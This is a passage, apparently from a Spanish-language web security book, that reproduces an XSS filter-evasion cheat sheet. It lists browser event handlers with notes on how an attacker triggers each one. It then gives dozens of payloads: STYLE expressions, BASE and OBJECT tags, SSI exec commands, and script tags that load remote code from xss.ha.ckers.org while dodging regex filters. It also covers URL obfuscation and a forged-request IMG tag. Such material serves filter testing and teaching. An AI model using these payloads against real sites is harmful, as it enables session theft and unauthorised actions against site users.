 ****************************************************************************************************
 298
+
+• FSCommand() (el atacante puede utilizar este desde un objeto Flash incrustado)
+• onAbort() (cuando el usuario aborta la carga de una imágen)
+• onActivate() (Cuando un objeto queda establecido como elemento activo)
+• onAfterPrint() (se activa después de que un usuario imprime o realiza una vista previa)
+• onAfterUpdate() (se activa en el objeto de la información después de ser actualizada en el
+objeto fuente)
+• onBeforeActivate() (salta antes de que se establezca como activo un elemento)
+• onBeforeCopy() (un usuario ejecutaría la cadena de ataque justo antes de que una
+selección se copie al portapapeles – un atacante puede realizar esto con la funciona
+execCommand(“Copy”))
+• onBeforeCut() (un usuario ejecuta la cadena de ataque justo antes de que se corte una
+selección)
+• onBeforeDeactivate() (se dispara justo después de que el activeElement se modifique
+desde el objeto actual)
+• onBeforeEditFocus() (se activa antes de que un objeto contenido en un elemento editable
+introduzca un estado de activación del interfaz de usuario o cuando un objeto contenedor
+editable es seleccionado)
+• onBeforePaste() (se necesita hacer que el usuario realice la función de pegado o que
+ejecute la función execCommand("Paste"))
+• onBeforePrint() (se necesita hacer que el usuario imprima o que el atacante utilice las
+funciones de print() o execCommand("Print")).
+• onBeforeUnload() (se necesita provocar que el usuario cierre el navegador – el atacante
+no puede cerrar ventanas a menos que pueda quedar dentro de la ventana raíz)
+• onBlur() (en este caso, cuando se cargue otra ventana emergente y la ventana pierda el
+foco)
+• onBounce() (se dispara cuando la propiedad de comportamiento del objeto marquesina
+queda establecida a “alternate” y el contenido de la marquesina alcanza uno de los lados
+de la ventana)
+• onCellChange() (se activa cuando los datos cambian en la fuente de datos) 
+
 ****************************************************************************************************
 299
+
+
+• onChange() (selección, texto o el campo TEXTAREA pierden el foco y su valor ha sido
+modificado)
+• onClick() (alguien hace clic en un formulario)
+• onContextMenu() (el usuario necesitaría hacer clic con el botón derecho en el área de
+ataque)
+• onControlSelect() (se dispara cuando el usuario va a realizar una selección de control de
+un objeto)
+• onCopy() (el usuario necesita copiar algo o puede explotarse utilizando la función
+execCommand(“Copy”))
+• onCut() (el usuario necesita cortar algo o puede explotarse utilizando la función
+execCommand("Cut"))
+• onDataAvailible() (el usuario necesitaría cambiar la información de un elemento o el
+atacante podría realizar la misma función)
+• onDataSetChanged() (se dispara cuando se establece que la información se exponga
+mediante un cambio en el objeto de la fuenta de datos)
+• onDataSetComplete() (se dispara para indicar que toda la información está disponible por
+parte de la fuente de datos)
+• onDblClick() (un usuario hace doble clic sobre un elemento de un formulario o un
+enlace)
+• onDeactivate() (se activa cuando se cambia el activeElement del objeto actual a otro en el
+documento)
+• onDrag() (necesita que un usuario arrastre un objeto)
+• onDragEnd() (requiere que un usuario haya arrastrado un objecto)
+• onDragLeave() (requiere que un usuario haya arrastrado un objeto en una zona no válida)
+• onDragEnter() (requiere que un usuario arrastre un objeto en una zona válida)
+• onDragOver() (requiere que un usuario arrastre un objeto en una zona válida)
+• onDragDrop() (el usuario suelta un objeto (por ejemplo un archivo) dentro de la ventana
+del navegador) 
+
 ****************************************************************************************************
 300
+
+• onDrop() (el usuario suelta un objeto (por ejemplo un archivo) dentro de la ventana de un
+navegador)
+• onError() (la carga de un documento o de una imagen provoca un error)
+• onErrorUpdate() (se dispara en un componente enlazado a datos (databound) cuando se
+provoca un error mientras se está actualizando la información asociada en el objeto
+fuente)
+• onExit() (cuando alguien hace clic en un vínculo o pulsa el botón de “Atrás”)
+• onFilterChange() (se dispara cuando un filtro visual completa el cambio de estado)
+• onFinish() (un atacante crea el exploit en el momento que la marquesina finalice su
+bucle)
+• onFocus() (el atacante ejecuta la cadena de ataque cuando la ventana pasa a primer plano)
+• onFocusIn() (el atacante ejecuta la cadena de ataque cuando la ventana pasa a primer
+plano)
+• onFocusOut() (el atacante ejecuta la cadena de ataque cuando la ventana pasa a segundo
+plano)
+• onHelp() (el atacante ejecuta la cadena de ataque cuando el los usuarios pulsen la tecla F1
+mientras la ventana esté en primer plano)
+• onKeyDown() (el usuario finaliza de pulsar una tecla)
+• onKeyPress() (el usuario pulsa o mantiene pulsada una tecla)
+• onKeyUp() (el usuario suelta una tecla)
+• onLayoutComplete() (el usuario imprime o realiza una vista previa de impresión)
+• onLoad() (el atacante ejecuta la cadena de ataque una vez la ventana termine su carga)
+• onLoseCapture() (puede explotarse con el método releaseCapture())
+• onMouseDown() (el atacante necesita provocar que un usuario haga clic en una imagen)
+• onMouseEnter() (el cursor se mueve sobre un objeto o un área)
+• onMouseLeave() (el atacante debe provocar que el usuario entre en una imagen o una
+tabla con el ratón y luego salga de ella) 
+
 ****************************************************************************************************
 301
+
+• onMouseMove() (el atacante debería provocar que el usuario mueva el ratón sobre una
+imagen o una tabla)
+• onMouseOut() (el atacante debe provocar que el usuario entre en una imagen o una tabla
+con el ratón y luego salga de ella)
+• onMouseOver() (el cursor se mueve sobre un objeto o un área)
+• onMouseUp() (el atacante necesita provocar que un usuario haga clic en una imagen)
+• onMouseWheel() (el atacante debería provocar que el usuario utilice la rueda de su ratón)
+• onMove() (el usuario mueve la página)
+• onMoveEnd() (el usuario mueve la página)
+• onMoveStart() (el usuario mueve la página)
+• onPaste() (se necesita que el usuario pegue información o el atacante utiliza la función
+execCommand(“Paste”))
+• onProgress() (el atacante podría utilizarlo en el momento en el que una película flash se
+esté cargando)
+• onPropertyChange() (un usuario tendría que cambiar la propiedad de un elemento)
+• onReadyStateChange() (un usuario tendría que cambiar la propiedad de un elemento)
+• onReset() (un usuario restablece un formulario)
+• onResize() (un usuario cambiaría el tamaño de la ventana; un atacante podría inicializar
+automáticamente con algo así: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
+• onResizeEnd() (un usuario cambiaría el tamaño de la ventana; un atacante podría
+inicializar automáticamente con algo así: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
+• onResizeStart() (un usuario cambiaría el tamaño de la ventana; un atacante podría
+inicializar automáticamente con algo así: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
+• onRowEnter() (un usuario tendría que modificar una fila en una fuente de datos)
+• onRowExit()(un usuario tendría que modificar una fila en una fuente de datos)
+• onRowDelete() (un usuario tendría que eliminar una fila de una fuente de datos)
+• onRowInserted() (un usuario tendría que añadir una fila a una fuente de datos) 
+
 ****************************************************************************************************
 302
+
+• onScroll() (un usuario tendría que desplazarse con las barras de desplazamiento, o un
+atacante utiliza la función scrollBy())
+• onSelect() (un usuario necesita seleccionar algo de texto – un atacante podría auto
+inicializar con algo como lo siguiente: window.document.execCommand("SelectAll");)
+• onSelectionChange() (un usuario necesita seleccionar algo de texto – un atacante podría
+auto inicializar con algo como lo siguiente:
+window.document.execCommand("SelectAll");)
+• onSelectStart() (un usuario necesita seleccionar algo de texto – un atacante podría auto
+inicializar con algo como lo siguiente: window.document.execCommand("SelectAll");)
+• onStart() (se dispara cada vez que se inicia el bucle de una marquesina)
+• onStop() (el usuario tendría que utilizar el botón de Detener del navegador o salir de la
+página)
+• onSubmit() (se necesita que un usuario envíe un formulario)
+• onUnload() (cuando un usuario hace clic en cualquier vínculo o hace clic en el botón de
+retroceder en el navegador o el atacante fuerza al usuario a que haga clic)
+IMG Dynsrc
+Funciona en IE
+<IMG DYNSRC="javascript:alert('XSS')">
+Input DynSrc
+<INPUT TYPE="image" DYNSRC="javascript:alert('XSS');">
+Background Source
+Funciona en IE
+<BGSOUND SRC="javascript:alert('XSS');">
+Inclusión con & JS 
+
 ****************************************************************************************************
 303
+
+Netscape 4.x
+<br size="&{alert('XSS')}">
+Inclusión de la fuente de una capa
+Netscape 4.x
+<LAYER SRC="http://xss.ha.ckers.org/a.js"></layer>
+Hoja de Estilos
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+Código VBScript en una imagen
+<IMG SRC='vbscript:msgbox("XSS")'>
+Mocha
+Sólo en los Netscape actuales
+<IMG SRC="mocha:[code]">
+Livescript
+Sólo en los Netscape actuales
+<IMG SRC="livescript:[code]">
+Meta
+Lo extraño sobre la actualización de los meta es que no envía el referrer en IE, Firefox,
+Netscape u Opera – por lo que puede utilizarse para ciertos tipos de ataque en los cuales tenemos
+que deshacernos de las direcciones de referencia o referrers.
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+IFrame
+
 ****************************************************************************************************
-****************************************************************************************************
-
-
-
 304
+
+Si se permiten los iframes entonces existe también una gran cantidad de problemas de XSS
+<IFRAME SRC=javascript:alert('XSS')></IFRAME>
+Frameset o conjunto de marcos
+<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAME></FRAMESET>
+Tablas
+Quién podría haber imaginado que las tablas podrían ser también objetivo de XSS….
+Excepto yo, ¡como no! ?
+<TABLE BACKGROUND="javascript:alert('XSS')">
+imagen de fondo en un DIV
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+Comportamiento de los DIV en exploits XSS .htc
+Sólo para Netscape
+<DIV STYLE="behaviour: url('http://xss.ha.ckers.org/exploit.htc');">
+DIV expression
+Sólo en IE. Una variante del siguiente ejemplo resulto efectiva contra un filtro real de XSS
+utilizando una nueva línea entre los dos puntos y el “expression"
+<DIV STYLE="width: expression(alert('XSS'));">
+Etiquetas Style con JavaScript corrompido
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+IMG Style con expression 
+
+
 ****************************************************************************************************
 305
+
+Esto en realidad es un híbrido de los anteriores vectores XSS, pero en realidad queda patente
+la dificultad que entraña analizar o filtrar etiquetas STYLE
+<IMG STYLE='
+xss:
+expre\ssion(alert("XSS"))'>
+Etiqueta Style
+Sólo en Netscape
+<STYLE TYPE="text/javascript">alert('X SS');</STYLE>
+Etiqueta Style utilizando una imagen de fondo
+<STYLE TYPE="text/css">.XSS{backgroundimage:url("javascript:alert('XSS')");}</STYLE><A
+CLASS=XSS></A>
+Etiqueta Style utilizando un fondo
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+Etiqueta BASE
+Para evitar errores de JavaScript se necesita comentar con // los caracteres siguientes, y con
+ello se mostrará el XSS. Además, esto se aprovecha de que los sitios Web utilizan las rutas del
+tipo "/images/image.jpg" en vez de las rutas completas:
+<BASE HREF="javascript:alert('XSS');//">
+Etiqueta Object
+Sólo para IE. Si se permiten objetos, también se pueden inyectar una especie de virus para
+infectar a los usuarios, lo mismo ocurre con la etiqueta APPLET:
+<OBJECT data=http://xss.ha.ckers.org width=400 height=400 type=text/xscriptlet">
+
+Etiqueta Object con Flash 
+
 ****************************************************************************************************
 306
+
+Utilizando la etiqueta OBJECT se puede incrustar una película flash que contenga un XSS:
+getURL("javascript:alert('XSS')")
+Utilizando el siguiente código en ActionScript dentro del fichero flash se puede ofuscar un
+vector XSS:
+a="get";
+b="URL";
+c="javascript:";
+d="alert('XSS');";
+eval(a+b+c+d);
+XML
+<XML SRC="javascript:alert('XSS');">
+IMG SRC, para cuando todo lo demás falla
+Asumiendo que únicamente se puede escribir algo dentro del campo <IMG
+SRC="$tusdatos"> y la palabra “javascript:” se elimina recursivamente:
+"> <BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
+Asumiendo de que sólo se caben unos pocos caracteres y se filtra todo lo que acabe en .js, se
+puede renombrar el fichero JavaScript a un fichero de imagen por ejemplo para el vector XSS:
+<SCRIPT SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
+Vector abierto de HTML/JS XSS
+Esto es útil como vector porque no se necesita que se cierre por completo un hueco. Aquí se
+da por hecho que en CUALQUIER ETIQUETA HTML se puede inyectar un XSS. Aunque no se
+cierre una etiqueta con “>”, las etiquetas siguientes se encargarán de cerrarla. Dos apuntes:
+1) esto deformará el código HTML dependiendo en el código que le siga
+2) Definitivamente se necesitan las comillas o el JavaScript fallará ya que en la siguiente que
+quiera mostrar será algo así como "</TABLE>". 
+
 ****************************************************************************************************
 307
+
+Como nota adicional, esto fue efectivo en un caso real contra un filtro XSS con el que di
+utilizando un IFRAME que no se cerró finalmente en vez de una etiqueta IMG:
+<IMG SRC="javascript:alert('XSS')"
+Server Side Includes
+Se necesita tener instalado en el servidor el SSI
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo
+'=http://xss.ha.ckers.org/a.js></SCRIPT>'"-->
+Mandatos embebidos en IMG
+Esto funciona en el caso de que una página Web en la que esto sea inyectado (como un panel
+Web) esté protegida con contraseña y dicha protección funcione según otros mandatos en el
+mismo dominio. Esto se puede utilizar para eliminar usuarios, añadir usuarios (si el usuario que
+visita la página es un administrador), enviar credenciales a cualquier lugar, etc… Este es el
+método menos utilizado aún siendo el más útil de los vectores XSS:
+<IMG
+SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscod
+e">
+XSS utilizando encapsulación de comillas en HTML
+Esto ha sido probado en IE.
+Para realizar ataques XSS en sitios que permitan "<SCRIPT>" pero no permitan "<SCRIPT
+SRC..." por culpa de una expresión regular como filtro "/<script[^>]+src/i":
+<SCRIPT a=">" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
+Para llevar a cabo ataques XSS en sitios que permitan "<SCRIPT>" pero no permitan
+"&ltscript src...", mediante por ejemplo el siguiente filtro:
+/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i
+Este es importante, ya que he llegado a ver esta expresión regular en algún caso): 
+
 ****************************************************************************************************
 308
+
+<SCRIPT =">" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
+O
+<SCRIPT a=">" '' SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
+O
+<SCRIPT "a='>'" SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
+Soy consciente de haber dicho que no iba a comentar técnicas de mitigación pero la única
+cosa que he visto para este ejemplo de XSS en el caso de que quiera permitir etiquetas
+<SCRIPT> pero no scripts remotos es una máquina de estados (y por supuesto que hay otros
+métodos para conseguir esto si se permiten etiquetas <SCRIPT>). Este XSS me sigue
+preocupando, ya que resulta casi imposible detenerlo sin tener que bloquear todo el contenido
+activo:
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT
+SRC="http://xss.ha.ckers.org/a.js"></SCRIPT>
+Evasión de cadenas URL
+Teniendo en cuenta que "http://www.google.com/" no se permita.
+• IP en vez de el nombre host
+<A HREF=http://66.102.7.147/>link</A>
+• Codificación de la URL
+<A
+HREF=http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D>link</A
+>
+Evasión de resolución del protocolo 
+
 ****************************************************************************************************
 309
+
+IE traduce el ht:// a http:// y existen otras muchas que funcionan para XSS también, como por
+ejemplo htt://, hta://, help://, etc… Esto resulta muy útil tambien en el caso en el que el espacio
+tambien sea un inconveniente (con dos caracteres menos se puede llegar muy lejos…)
+<A HREF=ht://www.google.com/>link</A>
+Eliminando los cnames
+Cuando se combina con los anteriores ejemplos, el eliminar las “www.” Puede ayudar a
+ahorrar 4 bytes más, llegando al ahorro de los 6 bytes para servidores que tengan esta propiedad
+configurada de manera adecuada:
+<A HREF=http://google.com/>link</A>
+Nombre de Dominio Totalmente Cualificado
+Añadir un punto final para la resolución FQDN o Nombre de Dominio Totalmente
+Cualificado.
+<A HREF=http://www.google.com./>link</A>
+JavaScript
+<A HREF="javascript:document.location='http://www.google.com/'">link</A>
+Remplazo de contenido como vector de ataque
+Tenemos en cuenta que "http://www.google.com/" no se remplaza con nada. He utilizado
+un ataque similar contra un filtro XSS real utilizando el propio filtro de conversión para ayudar a
+crear el vector de ataque (IE: "java&#x26;#x09;script:" se remplaza por
+"java&#x09;script:", que se muestra en IE y Opera.
+<A HREF=http://www.gohttp://www.google.com/ogle.com/>link</A>
+Codificación de caracteres
+La lista siguiente muestra las posibles codificaciones del carácter “<”. Los estándares son
+geniales, ¿verdad? ?
+
+
 ****************************************************************************************************
 310
+
 ****************************************************************************************************
 311
+
 ****************************************************************************************************
 
 
